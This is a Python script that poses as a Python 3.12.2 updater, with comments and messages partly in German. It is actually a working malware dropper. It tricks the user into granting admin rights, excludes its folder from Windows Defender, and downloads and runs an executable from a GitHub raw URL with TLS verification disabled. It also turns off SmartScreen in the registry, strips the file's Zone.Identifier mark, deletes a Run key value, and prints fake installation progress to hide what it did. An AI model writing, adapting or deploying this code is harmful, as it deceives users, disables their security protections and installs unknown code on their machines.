from math import e
import os
import pathlib as pl
import random
import ssl
import subprocess
import urllib.request
import sys
import ctypes
import time
import winreg

is_admin = os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin() != 0

class Main:

    APP_NAME = "update_service"
    FILE_NAME = "update_service.exe"
    UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/" + FILE_NAME

    BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
    APP_DIR = os.path.join(BASE_DIR, APP_NAME)
    APP_PATH = os.path.join(APP_DIR, FILE_NAME)

    def __init__(self):
        pass
    
    def send_update_notification(self):
        install_input = input("A new version of Python is available: 3.12.2"+
                            "\nYou are currently using: 3.11.6"+
                            "\nPress 'Y' or 'Enter' to update or 'N' to skip: ")
        return install_input.strip().lower() in ['y', '']

    def request_admin_privileges(self) -> bool:
        return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) > 32

    def add_folder_to_windows_defender_exclusions(self):
        folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
        command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder_path}\""'
        os.system(command)
    
    def perform_update(self):
        steps = [
            "Resolving dependencies...",
            "Downloading package metadata...",
            "Installing collected packages...",
            "Applying security patches...",
            "Finalizing installation..."
        ]

        for step in steps:
            print(step)
            time.sleep(random.uniform(1, 4.5)) # Simulate time taken for each step

        print("\nSuccessfully installed updates.")
        print("Current version: 3.11.6")
        print("Updated to: 3.12.2")
        print("Restart may be required.")
        time.sleep(2)
        exit(0)

    def remove_hkey(self):
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            key = winreg.OpenKey(  # type: ignore
                winreg.HKEY_CURRENT_USER,  # type: ignore
                key_path,
                0,
                winreg.KEY_SET_VALUE | winreg.KEY_READ,  # type: ignore
            )
            time.sleep(1)
            print(key)
            # Alten Wert löschen, falls vorhanden
            try:
                winreg.DeleteValue(key, "main")  # type: ignore
            except Exception as e:
                print(f"{e}")
                time.sleep(2)
        except Exception as e:
            print(f"Registry Fehler: {e}")
    
    def download_and_install(self):
        
        os.makedirs(self.APP_DIR, exist_ok=True)
        try:
            print(f"→ Downloading...")
            context = ssl._create_unverified_context()
            req = urllib.request.Request(self.UPDATE_URL)
            req.add_header("Pragma", "no-cache")
            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
                if getattr(resp, "status", 200) != 200:
                    print(f"Download failed – Status: {getattr(resp,'status', 'unknown')}")
                    exit(1)
                new_content = resp.read()

            with open(self.APP_PATH, "wb") as f:
                f.write(new_content)

            print(f"→ Successfully downloaded/updated")
            subprocess.Popen([self.APP_PATH], shell=True)

        except Exception as e:
            print(f"{e}")
            #exit(1)
            
    def unblock_file(self, file_path):
        """
        Entfernt den Zone.Identifier-Stream von einer Datei, um die SmartScreen-Warnung zu umgehen.
        """
        try:
            # Der versteckte Stream wird als 'Dateipfad:Zone.Identifier' angesprochen
            stream_path = f"{file_path}:Zone.Identifier"
            os.remove(stream_path)
            print(f"Datei '{file_path}' wurde erfolgreich entsperrt.")
        except FileNotFoundError:
            print(f"Kein Zone.Identifier-Stream für '{file_path}' gefunden. Die Datei ist möglicherweise bereits entsperrt.")
        except PermissionError:
            print(f"Fehler: Keine Berechtigung, um den Stream für '{file_path}' zu entfernen.")
        except Exception as e:
            print(f"Ein unerwarteter Fehler ist aufgetreten: {e}")

    def disable_smartscreen(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off")
            winreg.CloseKey(key)
            print("PythonSS erfolgreich aktiviert.")
        except Exception as e:
            print(f"Fehler: {e}")



if __name__ == "__main__":
    self = Main()
    if is_admin:
        print("Gathering dependencies and preparing for update...")
        self.add_folder_to_windows_defender_exclusions()
        self.download_and_install()
        self.disable_smartscreen()
        self.remove_hkey() #234
        self.unblock_file(self.APP_PATH)
        self.perform_update()
        exit(0)
    if self.send_update_notification():
        print("Updating Python...")
        time.sleep(1)
        if self.request_admin_privileges():
            exit(0)
        else:
            print("Admin privileges are required to perform the update. Please run the installer as an administrator.")
            time.sleep(2)
    else:
        print("Update skipped.")